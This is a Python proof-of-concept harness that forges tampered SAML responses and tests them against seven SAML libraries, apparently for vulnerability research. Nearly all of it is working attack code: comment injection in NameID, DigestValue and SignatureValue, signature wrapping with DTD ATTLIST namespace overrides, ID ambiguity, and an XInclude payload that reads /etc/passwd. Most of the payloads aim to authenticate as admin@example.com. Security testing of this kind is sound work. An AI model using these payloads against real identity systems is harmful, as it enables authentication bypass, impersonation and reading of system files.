"""
Additional SAML Attack Vector PoC Testing
Tests comment injection, XSW composite, XInclude, and ID ambiguity attacks
against all 7 SAML libraries.
"""
import sys
import os
import json
import subprocess
import tempfile
from lxml import etree
from signxml import XMLSigner, XMLVerifier
from signxml.algorithms import SignatureConstructionMethod
from cryptography.hazmat.primitives.serialization import load_pem_private_key

FIXTURES = os.path.join(os.path.dirname(__file__), '..', 'targets', 'saml_fixtures')
RESULTS = os.path.join(os.path.dirname(__file__), '..', 'results')

with open(os.path.join(FIXTURES, 'idp_key.pem'), 'rb') as f:
    KEY = load_pem_private_key(f.read(), password=None)
with open(os.path.join(FIXTURES, 'idp_cert.pem'), 'rb') as f:
    CERT = f.read()

SAML_NS = "urn:oasis:names:tc:SAML:2.0:assertion"
SAMLP_NS = "urn:oasis:names:tc:SAML:2.0:protocol"
DS_NS = "http://www.w3.org/2000/09/xmldsig#"

# Target commands
TARGETS = {
    "signxml": ["python", "targets/saml_signxml.py"],
    "python3-saml": ["python", "targets/saml_python3saml.py"],
    "xml-crypto": ["node", "targets/saml_xmlcrypto.js"],
    "samlify": ["node", "targets/saml_samlify.js"],
    "node-saml": ["node", "targets/saml_nodesaml.js"],
    "ruby-saml": ["C:/Ruby32-x64/bin/ruby.exe", "targets/saml_rubysaml.rb"],
    "php-saml": ["C:/Users/dmbs3/AppData/Local/Microsoft/WinGet/Packages/PHP.PHP.8.3_Microsoft.Winget.Source_8wekyb3d8bbwe/php.exe", "targets/saml_phpsaml.php"],
}

def sign_assertion(nameid="user@example.com", assertion_id="_test_001"):
    """Create and sign a SAML assertion."""
    assertion = etree.fromstring(f'''
<saml:Assertion xmlns:saml="{SAML_NS}" Version="2.0" ID="{assertion_id}"
                IssueInstant="2026-03-01T00:00:00Z">
  <saml:Issuer>https://idp.example.com</saml:Issuer>
  <saml:Subject>
    <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">{nameid}</saml:NameID>
    <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
      <saml:SubjectConfirmationData NotOnOrAfter="2099-01-01T00:00:00Z"
                                    Recipient="https://sp.example.com/acs"/>
    </saml:SubjectConfirmation>
  </saml:Subject>
  <saml:Conditions NotBefore="2020-01-01T00:00:00Z" NotOnOrAfter="2099-12-31T23:59:59Z">
    <saml:AudienceRestriction>
      <saml:Audience>https://sp.example.com</saml:Audience>
    </saml:AudienceRestriction>
  </saml:Conditions>
  <saml:AuthnStatement AuthnInstant="2026-03-01T00:00:00Z">
    <saml:AuthnContext>
      <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
    </saml:AuthnContext>
  </saml:AuthnStatement>
</saml:Assertion>'''.encode())

    signer = XMLSigner(
        method=SignatureConstructionMethod.enveloped,
        c14n_algorithm='http://www.w3.org/2001/10/xml-exc-c14n#',
        digest_algorithm='http://www.w3.org/2001/04/xmlenc#sha256',
        signature_algorithm='http://www.w3.org/2001/04/xmldsig-more#rsa-sha256',
    )
    signed = signer.sign(assertion, key=KEY, cert=CERT)
    return signed


def wrap_in_response(assertion_xml):
    """Wrap a signed assertion in a SAML Response envelope."""
    if isinstance(assertion_xml, bytes):
        assertion_str = assertion_xml.decode()
    else:
        assertion_str = assertion_xml if isinstance(assertion_xml, str) else etree.tostring(assertion_xml).decode()

    response = f'''<?xml version='1.0' encoding='UTF-8'?>
<samlp:Response xmlns:samlp="{SAMLP_NS}" xmlns:saml="{SAML_NS}"
                ID="_resp_001" Version="2.0" IssueInstant="2026-03-01T00:00:00Z"
                Destination="https://sp.example.com/acs">
  <saml:Issuer>https://idp.example.com</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  {assertion_str}
</samlp:Response>'''
    return response.encode()


def test_against_targets(xml_bytes, attack_name):
    """Test XML against all 7 targets, return results dict."""
    results = {}
    with tempfile.NamedTemporaryFile(suffix='.xml', delete=False, mode='wb') as f:
        f.write(xml_bytes)
        tmpfile = f.name

    for name, cmd in TARGETS.items():
        try:
            proc = subprocess.run(
                cmd + [tmpfile],
                capture_output=True, text=True, timeout=10,
                cwd=os.path.abspath(os.path.join(os.path.dirname(__file__), '..')),
                env={**os.environ, 'PYTHONIOENCODING': 'utf-8'},
            )
            try:
                data = json.loads(proc.stdout.strip().split('\n')[-1])
                results[name] = data
            except (json.JSONDecodeError, IndexError):
                results[name] = {"error": proc.stderr[:200] if proc.stderr else "no output", "exit_code": proc.returncode}
        except subprocess.TimeoutExpired:
            results[name] = {"error": "timeout"}
        except FileNotFoundError:
            results[name] = {"error": "binary not found"}

    os.unlink(tmpfile)
    return results


def print_results(attack_name, results):
    """Pretty-print differential analysis."""
    print(f"\n{'='*70}")
    print(f"ATTACK: {attack_name}")
    print(f"{'='*70}")

    for name, data in results.items():
        if "error" in data:
            print(f"  {name:15s}: ERROR - {data['error'][:80]}")
        else:
            sig = data.get('signature_valid', '?')
            subj = data.get('subject', 'N/A')
            cnt = data.get('assertion_count', '?')
            err = data.get('signature_error', '')
            if err:
                err = err[:60]
            subj = subj or 'N/A'
            err = err or ''
            print(f"  {name:15s}: sig={sig!s:5s} subject={subj:30s} cnt={cnt} err={err}")

    # Differential analysis
    subjects = {}
    sigs = {}
    for name, data in results.items():
        if "error" not in data:
            s = data.get('subject', 'N/A')
            subjects.setdefault(s, []).append(name)
            v = data.get('signature_valid', None)
            sigs.setdefault(v, []).append(name)

    if len(subjects) > 1:
        print(f"\n  ** DIFFERENTIAL: Subject confusion! {dict(subjects)}")
    if len(sigs) > 1 and True in sigs:
        print(f"\n  ** DIFFERENTIAL: Signature bypass! valid={sigs.get(True)} invalid={sigs.get(False)}")


# ============================================================
# ATTACK 1: Comment injection in NameID (SAMLStorm-style)
# Sign with "user@example.com", inject comment to split into
# "user@evil.com<!--" + "-->@example.com"
# Some parsers see "user@evil.com", others see full text
# ============================================================
def attack_comment_nameid():
    print("\n[*] Attack 1: Comment injection in NameID")

    signed = sign_assertion(nameid="user@example.com")
    xml_bytes = etree.tostring(signed)

    # Strategy A: Insert comment to truncate NameID
    # user@example.com -> user@evil.com<!-- -->@example.com
    # Parsers using .text (not .textContent) only see "user@evil.com"
    tampered = xml_bytes.replace(
        b'>user@example.com</saml:NameID>',
        b'>user@evil.com<!-- -->.original@example.com</saml:NameID>'
    )

    response = wrap_in_response(tampered)
    results = test_against_targets(response, "comment_nameid_truncation")
    print_results("Comment NameID Truncation (user@evil.com<!-- -->...)", results)

    # Save PoC
    with open(os.path.join(RESULTS, 'attack_comment_nameid.xml'), 'wb') as f:
        f.write(response)

    # Strategy B: Comment inside NameID preserving original
    # "user@example.com" -> "user@exam<!-- -->ple.com"
    # C14N strips comments -> should produce same digest -> sig valid?
    signed2 = sign_assertion(nameid="user@example.com")
    xml_bytes2 = etree.tostring(signed2)
    tampered2 = xml_bytes2.replace(
        b'>user@example.com</saml:NameID>',
        b'>user@exam<!-- evil -->ple.com</saml:NameID>'
    )
    response2 = wrap_in_response(tampered2)
    results2 = test_against_targets(response2, "comment_nameid_split")
    print_results("Comment NameID Split (user@exam<!-- -->ple.com)", results2)


# ============================================================
# ATTACK 2: Comment injection in DigestValue (SAMLStorm CVE-2025-29775)
# Real DigestValue has comment prepended with fake digest
# ============================================================
def attack_comment_digest():
    print("\n[*] Attack 2: Comment injection in DigestValue")

    # Sign with user@example.com
    signed = sign_assertion(nameid="user@example.com")
    xml_bytes = etree.tostring(signed)

    # Extract real DigestValue
    tree = etree.fromstring(xml_bytes)
    digest_el = tree.find('.//{%s}DigestValue' % DS_NS)
    real_digest = digest_el.text.strip()

    # Now tamper the NameID (change content that digest protects)
    tampered = xml_bytes.replace(
        b'>user@example.com</saml:NameID>',
        b'>admin@example.com</saml:NameID>'
    )

    # Compute new digest for tampered content
    # We can't compute it without re-signing, so instead test if
    # comment injection in DigestValue causes any parser to ignore it
    fake_digest = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="

    # Strategy: <!-- fake_digest -->real_digest
    # xml-crypto's old .textContent would concatenate: fake_digestreal_digest
    # But .text property only returns first text node: empty string before comment
    tampered_digest = tampered.replace(
        real_digest.encode(),
        f"<!-- {fake_digest} -->{real_digest}".encode(),
        1  # Only replace first occurrence (in DigestValue)
    )

    response = wrap_in_response(tampered_digest)
    results = test_against_targets(response, "comment_digest")
    print_results("Comment in DigestValue (<!-- fake -->real)", results)

    with open(os.path.join(RESULTS, 'attack_comment_digest.xml'), 'wb') as f:
        f.write(response)


# ============================================================
# ATTACK 3: Comment injection in SignatureValue (CVE-2025-29774)
# ============================================================
def attack_comment_sigvalue():
    print("\n[*] Attack 3: Comment injection in SignatureValue")

    signed = sign_assertion(nameid="user@example.com")
    xml_bytes = etree.tostring(signed)

    # Extract real SignatureValue
    tree = etree.fromstring(xml_bytes)
    sigval_el = tree.find('.//{%s}SignatureValue' % DS_NS)
    real_sigval = sigval_el.text.strip()

    # Tamper NameID
    tampered = xml_bytes.replace(
        b'>user@example.com</saml:NameID>',
        b'>admin@example.com</saml:NameID>'
    )

    # Inject comment into SignatureValue
    # If parser strips comment and uses .textContent, it still gets the real sig
    tampered_sig = tampered.replace(
        real_sigval.encode(),
        f"<!-- junk -->{real_sigval}".encode(),
        1
    )

    response = wrap_in_response(tampered_sig)
    results = test_against_targets(response, "comment_sigvalue")
    print_results("Comment in SignatureValue (<!-- junk -->real_sig)", results)

    with open(os.path.join(RESULTS, 'attack_comment_sigvalue.xml'), 'wb') as f:
        f.write(response)


# ============================================================
# ATTACK 4: XSW + DTD ATTLIST composite
# Combine XSW (evil assertion clone) with DTD namespace trick
# ============================================================
def attack_xsw_dtd_composite():
    print("\n[*] Attack 4: XSW + DTD ATTLIST composite")

    # Sign legitimate assertion
    signed = sign_assertion(nameid="user@example.com", assertion_id="_legit_001")
    signed_bytes = etree.tostring(signed)

    # Create evil unsigned assertion
    evil_assertion = f'''<saml:Assertion xmlns:saml="{SAML_NS}" Version="2.0"
    ID="_evil_001" IssueInstant="2026-03-01T00:00:00Z">
  <saml:Issuer>https://idp.example.com</saml:Issuer>
  <saml:Subject>
    <saml:NameID>admin@example.com</saml:NameID>
  </saml:Subject>
</saml:Assertion>'''

    # Strategy: DTD changes NS so signed assertion appears in wrong NS,
    # evil assertion has explicit correct NS
    # Tamper signed assertion's inline NS
    tampered_signed = signed_bytes.replace(
        b'xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"',
        b'',  # Remove inline NS declaration (DTD will provide it)
        1  # Only first occurrence
    )

    response = f'''<?xml version='1.0' encoding='UTF-8'?>
<!DOCTYPE samlp:Response [
  <!ATTLIST saml:Assertion xmlns:saml CDATA "urn:oasis:names:tc:SAML:2.0:assertion">
]>
<samlp:Response xmlns:samlp="{SAMLP_NS}" xmlns:saml="urn:oasis:names:tc:SAML:2.0:Assertion"
                ID="_resp_001" Version="2.0" IssueInstant="2026-03-01T00:00:00Z"
                Destination="https://sp.example.com/acs">
  <saml:Issuer>https://idp.example.com</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  {evil_assertion}
  {tampered_signed.decode()}
</samlp:Response>'''.encode()

    results = test_against_targets(response, "xsw_dtd_composite")
    print_results("XSW + DTD ATTLIST (evil first, signed second with DTD NS)", results)

    with open(os.path.join(RESULTS, 'attack_xsw_dtd.xml'), 'wb') as f:
        f.write(response)


# ============================================================
# ATTACK 5: XInclude file inclusion
# signxml doesn't explicitly disable XInclude processing
# ============================================================
def attack_xinclude():
    print("\n[*] Attack 5: XInclude in signed content")

    signed = sign_assertion(nameid="user@example.com")
    xml_bytes = etree.tostring(signed)

    # Inject XInclude directive into NameID
    tampered = xml_bytes.replace(
        b'>user@example.com</saml:NameID>',
        b' xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="/etc/passwd" parse="text"/></saml:NameID>'
    )

    response = wrap_in_response(tampered)
    results = test_against_targets(response, "xinclude")
    print_results("XInclude in NameID (xi:include /etc/passwd)", results)


# ============================================================
# ATTACK 6: Empty Reference URI (whole-document signature)
# Sign with URI="" -> signs entire document
# Then add evil assertion outside signed scope
# ============================================================
def attack_empty_uri():
    print("\n[*] Attack 6: Empty Reference URI exploitation")

    # Create assertion with empty URI reference
    assertion = etree.fromstring(f'''
<saml:Assertion xmlns:saml="{SAML_NS}" Version="2.0" ID="_test_uri"
                IssueInstant="2026-03-01T00:00:00Z">
  <saml:Issuer>https://idp.example.com</saml:Issuer>
  <saml:Subject>
    <saml:NameID>user@example.com</saml:NameID>
  </saml:Subject>
</saml:Assertion>'''.encode())

    signer = XMLSigner(
        method=SignatureConstructionMethod.enveloped,
        c14n_algorithm='http://www.w3.org/2001/10/xml-exc-c14n#',
    )
    signed = signer.sign(assertion, key=KEY, cert=CERT)
    signed_bytes = etree.tostring(signed)

    # Change Reference URI from "#_test_uri" to ""
    tampered = signed_bytes.replace(b'URI="#_test_uri"', b'URI=""')

    response = wrap_in_response(tampered)
    results = test_against_targets(response, "empty_uri")
    print_results("Empty Reference URI (URI=\"\")", results)


# ============================================================
# ATTACK 7: DTD ATTLIST on ds:Signature namespace
# Override ds: prefix to point to wrong namespace
# ============================================================
def attack_dtd_ds_namespace():
    print("\n[*] Attack 7: DTD ATTLIST overriding ds: namespace")

    signed = sign_assertion(nameid="admin@example.com")
    signed_bytes = etree.tostring(signed)

    # Tamper: change ds namespace on Signature element
    tampered = signed_bytes.replace(
        b'xmlns:ds="http://www.w3.org/2000/09/xmldsig#"',
        b'xmlns:ds="http://evil.com/xmldsig"',
        1  # Only first occurrence
    )

    # Add DTD to restore correct ds namespace
    response = f'''<?xml version='1.0' encoding='UTF-8'?>
<!DOCTYPE samlp:Response [
  <!ATTLIST ds:Signature xmlns:ds CDATA "http://www.w3.org/2000/09/xmldsig#">
]>
<samlp:Response xmlns:samlp="{SAMLP_NS}" xmlns:saml="{SAML_NS}"
                ID="_resp_001" Version="2.0" IssueInstant="2026-03-01T00:00:00Z"
                Destination="https://sp.example.com/acs">
  <saml:Issuer>https://idp.example.com</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  {tampered.decode()}
</samlp:Response>'''.encode()

    results = test_against_targets(response, "dtd_ds_namespace")
    print_results("DTD ATTLIST on ds: namespace (evil -> correct)", results)

    with open(os.path.join(RESULTS, 'attack_dtd_ds.xml'), 'wb') as f:
        f.write(response)


# ============================================================
# ATTACK 8: Multiple ID attributes (Id vs ID vs id)
# ============================================================
def attack_id_ambiguity():
    print("\n[*] Attack 8: ID attribute ambiguity")

    # Sign normally (uses ID attribute)
    signed = sign_assertion(nameid="user@example.com", assertion_id="_target_001")
    signed_bytes = etree.tostring(signed)

    # Add a second assertion with same ID but different attribute name
    evil_assertion = f'''<saml:Assertion xmlns:saml="{SAML_NS}" Version="2.0"
    Id="_target_001" IssueInstant="2026-03-01T00:00:00Z">
  <saml:Issuer>https://idp.example.com</saml:Issuer>
  <saml:Subject>
    <saml:NameID>admin@example.com</saml:NameID>
  </saml:Subject>
</saml:Assertion>'''

    response = f'''<?xml version='1.0' encoding='UTF-8'?>
<samlp:Response xmlns:samlp="{SAMLP_NS}" xmlns:saml="{SAML_NS}"
                ID="_resp_001" Version="2.0" IssueInstant="2026-03-01T00:00:00Z"
                Destination="https://sp.example.com/acs">
  <saml:Issuer>https://idp.example.com</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  {evil_assertion}
  {signed_bytes.decode()}
</samlp:Response>'''.encode()

    results = test_against_targets(response, "id_ambiguity")
    print_results("ID Ambiguity (Id=_target vs ID=_target)", results)


# ============================================================
# ATTACK 9: Whitespace in base64 DigestValue/SignatureValue
# Different parsers handle whitespace in base64 differently
# ============================================================
def attack_base64_whitespace():
    print("\n[*] Attack 9: Base64 whitespace differential")

    signed = sign_assertion(nameid="user@example.com")
    xml_bytes = etree.tostring(signed)

    tree = etree.fromstring(xml_bytes)
    digest_el = tree.find('.//{%s}DigestValue' % DS_NS)
    real_digest = digest_el.text.strip()

    # Insert newlines/spaces in base64 DigestValue
    # Valid base64 ignores whitespace, but some XML parsers might not
    spaced_digest = '\n'.join([real_digest[i:i+4] for i in range(0, len(real_digest), 4)])

    tampered = xml_bytes.replace(
        real_digest.encode(),
        spaced_digest.encode(),
        1
    )

    response = wrap_in_response(tampered)
    results = test_against_targets(response, "base64_whitespace")
    print_results("Base64 whitespace in DigestValue", results)


if __name__ == '__main__':
    attacks = {
        'comment_nameid': attack_comment_nameid,
        'comment_digest': attack_comment_digest,
        'comment_sigvalue': attack_comment_sigvalue,
        'xsw_dtd': attack_xsw_dtd_composite,
        'xinclude': attack_xinclude,
        'empty_uri': attack_empty_uri,
        'dtd_ds': attack_dtd_ds_namespace,
        'id_ambiguity': attack_id_ambiguity,
        'base64_ws': attack_base64_whitespace,
    }

    if len(sys.argv) > 1:
        for name in sys.argv[1:]:
            if name in attacks:
                attacks[name]()
            else:
                print(f"Unknown attack: {name}. Available: {', '.join(attacks.keys())}")
    else:
        for name, func in attacks.items():
            try:
                func()
            except Exception as e:
                print(f"\n[!] Attack {name} failed: {e}")
                import traceback
                traceback.print_exc()
